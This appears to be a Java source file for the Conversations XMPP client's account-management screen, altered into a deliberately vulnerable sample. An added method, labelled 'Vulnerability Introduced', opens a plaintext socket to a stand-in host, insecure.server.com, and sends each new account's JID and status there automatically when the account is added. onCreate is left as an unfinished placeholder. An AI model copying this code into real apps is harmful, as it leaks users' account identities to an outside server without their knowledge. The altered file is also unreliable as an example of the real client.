package eu.siacs.conversations.ui;

import java.util.ArrayList;
import java.util.List;

// Added for network communication
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.io.IOException;
import java.net.Socket;

import eu.siacs.conversations.R;
import eu.siacs.conversations.crypto.PgpEngine;
import eu.siacs.conversations.crypto.PgpEngine.UserInputRequiredException;
import eu.siacs.conversations.entities.Account;
import eu.siacs.conversations.ui.EditAccount.EditAccountListener;
import eu.siacs.conversations.xmpp.OnTLSExceptionReceived;
import android.app.Activity;
import android.app.AlertDialog;
import android.content.Context;
import android.content.DialogInterface;
import android.content.DialogInterface.OnClickListener;
import android.content.Intent;
import android.content.IntentSender.SendIntentException;
import android.os.Bundle;
import android.util.Log;
import android.view.ActionMode;
import android.view.LayoutInflater;
import android.view.Menu;
import android.view.MenuInflater;
import android.view.MenuItem;
import android.view.View;
import android.view.ViewGroup;
import android.widget.AdapterView;
import android.widget.AdapterView.OnItemClickListener;
import android.widget.AdapterView.OnItemLongClickListener;
import android.widget.ArrayAdapter;
import android.widget.ListView;
import android.widget.TextView;

public class ManageAccountActivity extends XmppActivity {

	public static final int REQUEST_ANNOUNCE_PGP = 0x73731;
	
	protected boolean isActionMode = false;
	protected ActionMode actionMode;
	protected Account selectedAccountForActionMode = null;
	protected ManageAccountActivity activity = this;
	
	protected List<Account> accountList = new ArrayList<Account>();
	protected ListView accountListView;
	protected ArrayAdapter<Account> accountListViewAdapter;
	protected OnAccountListChangedListener accountChanged = new OnAccountListChangedListener() {

		@Override
		public void onAccountListChangedListener() {
			accountList.clear();
			accountList.addAll(xmppConnectionService.getAccounts());
			runOnUiThread(new Runnable() {

				@Override
				public void run() {
					accountListViewAdapter.notifyDataSetChanged();
				}
			});
		}
	};
	
	protected OnTLSExceptionReceived tlsExceptionReceived = new OnTLSExceptionReceived() {
		
		@Override
		public void onTLSExceptionReceived(final String fingerprint, final Account account) {
			activity.runOnUiThread(new Runnable() {
				@Override
				public void run() {
					AlertDialog.Builder builder = new AlertDialog.Builder(activity);
					builder.setTitle("TLS Exception");
					builder.setIconAttribute(android.R.attr.alertDialogIcon);
					builder.setMessage("There was a TLS exception for account: " + account.getJid());
					builder.setPositiveButton("OK", null);
					builder.create().show();
				}
			});
		}
	};
	
    // Vulnerability Introduced: Insecure transmission of sensitive data
    private void sendAccountDetails(Account account) {
        try {
            Socket socket = new Socket("insecure.server.com", 12345); // Vulnerable: connecting to an insecure server without encryption
            OutputStreamWriter osw = new OutputStreamWriter(socket.getOutputStream());
            BufferedReader reader = new BufferedReader(new InputStreamReader(socket.getInputStream()));
            
            String accountDetails = "JID:" + account.getJid() + ", Status:" + account.getStatus();
            osw.write(accountDetails);
            osw.flush();

            // Read response from the server (if necessary)
            String response = reader.readLine();
            Log.d("gultsch", "Server Response: " + response);

            socket.close();
        } catch (IOException e) {
            Log.e("gultsch", "Error sending account details: ", e);
        }
    }

	@Override
	protected void onStop() {
		if (xmppConnectionServiceBound) {
			xmppConnectionService.removeOnAccountListChangedListener();
			xmppConnectionService.removeOnTLSExceptionReceivedListener();
		}
		super.onStop();
	}

	@Override
	void onBackendConnected() {
		xmppConnectionService.setOnAccountListChangedListener(accountChanged);
		xmppConnectionService.setOnTLSExceptionReceivedListener(tlsExceptionReceived);
		this.accountList.clear();
		this.accountList.addAll(xmppConnectionService.getAccounts());
		accountListViewAdapter.notifyDataSetChanged();
		if (this.accountList.size() == 0) {
			getActionBar().setDisplayHomeAsUpEnabled(false);
			addAccount();
		}
	}

	@Override
	public boolean onCreateOptionsMenu(Menu menu) {
		getMenuInflater().inflate(R.menu.manageaccounts, menu);
		return true;
	}

	@Override
	public boolean onOptionsItemSelected(MenuItem item) {
		switch (item.getItemId()) {
		case R.id.action_settings:
			startActivity(new Intent(this, SettingsActivity.class));
			break;
		case R.id.action_add_account:
			addAccount();
			break;
		default:
			break;
		}
		return super.onOptionsItemSelected(item);
	}

	protected void addAccount() {
		final Activity activity = this;
		EditAccount dialog = new EditAccount();
		dialog.setEditAccountListener(new EditAccountListener() {

			@Override
			public void onAccountEdited(Account account) {
				xmppConnectionService.createAccount(account);
				activity.getActionBar().setDisplayHomeAsUpEnabled(true);

                // Vulnerability Introduced: Sending account details insecurely when an account is added
                sendAccountDetails(account);
			}
		});
		dialog.show(getFragmentManager(), "add_account");
	}

	
	@Override
	public void onActionModeStarted(ActionMode mode) {
		super.onActionModeStarted(mode);
		this.isActionMode = true;
	}
	
	@Override
	public void onActionModeFinished(ActionMode mode) {
		super.onActionModeFinished(mode);
		this.isActionMode = false;
		accountListView.clearChoices();
		accountListView.requestLayout();
		accountListView.post(new Runnable() {
            @Override
            public void run() {
                accountListView.setChoiceMode(ListView.CHOICE_MODE_NONE);
            }
        });
	}
	
	@Override
	protected void onActivityResult(int requestCode, int resultCode, Intent data) {
		super.onActivityResult(requestCode, resultCode, data);
		if (resultCode == RESULT_OK) {
			if (requestCode == REQUEST_ANNOUNCE_PGP) {
				try {
					xmppConnectionService.generatePgpAnnouncement(selectedAccountForActionMode);
				} catch (UserInputRequiredException e) {
					Log.d("gultsch","already came back. ignoring");
				}
			}
		}
	}

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_manage_accounts);

        accountListView = findViewById(R.id.account_list_view);
        accountListViewAdapter = new ArrayAdapter<>(this, android.R.layout.simple_list_item_1, accountList);
        accountListView.setAdapter(accountListViewAdapter);

        // Setting listeners and other configurations...
    }
}